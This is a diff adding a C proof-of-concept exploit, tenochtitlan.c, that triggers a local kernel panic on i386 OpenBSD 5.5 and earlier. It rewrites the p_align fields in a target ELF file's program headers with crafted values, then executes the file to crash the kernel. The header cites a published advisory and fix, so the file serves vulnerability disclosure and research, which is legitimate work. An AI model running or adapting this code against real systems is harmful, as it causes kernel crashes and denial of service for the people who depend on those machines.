@@ -1,0 +1,147 @@
+/*
+ * tenochtitlan.c
+ *
+ * OpenBSD <= 5.5 Local Kernel Panic
+ * by Alejandro Hernandez (@nitr0usmx)
+ *
+ * Advisory and technical details:
+ * http://www.ioactive.com/pdfs/IOActive_Advisory_OpenBSD_5_5_Local_Kernel_Panic.pdf
+ *
+ * Fix: http://www.openbsd.org/errata55.html#013_kernexec
+ *
+ * This PoC works only for i386.
+ * 
+ * Bug found with Melkor (ELF file format fuzzer)
+ * https://github.com/IOActive/Melkor_ELF_Fuzzer
+ *
+ * Mexico / Oct 2014
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <sys/param.h>
+#include <sys/types.h>
+
+#ifndef  __OpenBSD__
+	#error "Not an OpenBSD system !!!1111";
+#else
+#include <sys/exec_elf.h>
+#endif
+
+#ifndef __i386__
+	#error "Not an i386 system !!!1111";
+#endif
+
+// In Aztec mythology, Huitzilopochtli, was a god of war, a sun god, 
+// the patron of the city of Tenochtitlan, the Capital of the Aztec Empire.
+const char pyramid[] = 
+"                  _____\n"
+"                 _|[]_|_\n"
+"               _/_/=|_\\_\\_\n"
+"             _/_ /==| _\\ _\\_\n"
+"           _/__ /===|_ _\\ __\\_\n"
+"         _/_ _ /====| ___\\  __\\_\n"
+"       _/ __ _/=====|_ ___\\ ___ \\_\n"
+"     _/ ___ _/======| ____ \\_  __ \\_\n";
+
+struct {
+	unsigned int idx;
+	Elf32_Word   p_align;
+} targets[] = {
+	{ 6, 0xb16b00b5 }, // (  *  )(  *  )
+	{ 6, 0xdeadface },
+	{ 4, 0x00001001 },
+	{ 0, 0x00000004 }
+};
+
+int main(int argc, char **argv)
+{
+	Elf32_Ehdr *hdr;
+	Elf32_Phdr *pht; // Program Header Table
+	struct stat statinfo;
+	char *elfptr;
+	int fd, r;
+
+	if(argc < 2){
+		fprintf(stderr, "Usage: %s <elf_executable>\n", argv[0]);
+		exit(-1);
+	}
+
+	if((fd = open(argv[1], O_RDWR)) == -1){
+		perror("open");
+		exit(-1);
+	}
+
+	if(fstat(fd, &statinfo) == -1){
+		perror("stat");
+		close(fd);
+		exit(-1);
+	}
+
+	if((elfptr = (char *) mmap(NULL, statinfo.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED){
+		perror("mmap");
+		close(fd);
+		exit(-1);
+	}
+
+	hdr = (Elf32_Ehdr *) (elfptr);
+	pht = (Elf32_Phdr *) (elfptr + hdr->e_phoff);
+
+	printf("[*] hdr->e_phoff:\t0x%.4x\n", hdr->e_phoff);
+	printf("[*] hdr->e_phnum:\t0x%.4x\n", hdr->e_phnum);
+
+	srand(time(NULL));
+	r = rand();
+
+	if(r % 3 == 0){
+#ifdef OpenBSD5_5
+		pht[targets[0].idx].p_align = targets[0].p_align;
+		printf("[*] PHT[%d].p_align = 0x%x\n", targets[0].idx, pht[targets[0].idx].p_align);
+#else // OpenBSD 5.2 didn't panic with 0xb16b00b5 in the last LOAD's p_align
+		pht[targets[1].idx].p_align = targets[1].p_align;
+		printf("[*] PHT[%d].p_align = 0x%x\n", targets[1].idx, pht[targets[1].idx].p_align);
+#endif
+	} else if(r % 3 == 1){
+		pht[targets[2].idx].p_align = targets[2].p_align;
+		printf("[*] PHT[%d].p_align = 0x%x\n", targets[2].idx, pht[targets[2].idx].p_align);
+	} else {
+		int p;
+
+		for(p = 0; p < hdr->e_phnum; p++, pht++)
+			if(pht->p_type == PT_LOAD){
+				pht->p_align = targets[3].p_align;
+				printf("[*] PHT[%d].p_align = 0x%x\n", p, pht->p_align);
+			}
+	}
+
+	// Synchronize the ELF in memory and the file system
+	if(msync(elfptr, 0, MS_ASYNC) == -1){
+		perror("msync");
+		close(fd);
+		exit(-1);
+	}
+
+	if(munmap(elfptr, statinfo.st_size) == -1){
+		perror("munmap");
+		close(fd);
+		exit(-1);
+	}
+
+	close(fd);
+
+	printf("%s", pyramid);
+
+	sleep(1);
+	system(argv[1]);
+
+	// Should never reach this point, however sometimes the OS didn't crash with
+	// system() until the 2nd execution. Same behavior with execl and execv too.
+	printf("... try to execute %s manually.\n", argv[1]);
+
+	return -1;
+}
